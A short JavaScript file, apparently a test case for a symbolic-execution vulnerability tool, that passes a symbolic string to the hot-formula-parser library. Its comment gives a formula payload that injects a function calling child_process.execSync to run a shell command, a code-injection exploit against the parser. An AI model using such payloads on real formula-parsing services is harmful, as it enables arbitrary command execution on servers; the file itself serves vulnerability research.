const FormulaParser = require("hot-formula-parser").Parser;
const esl_symbolic = require("esl_symbolic");
let payload = esl_symbolic.string("payload");
let parser = new FormulaParser();
parser.parse(payload);
//"SUM([(function(){require('child_process').execSync('touch hot-formula-parser')})(),2])"
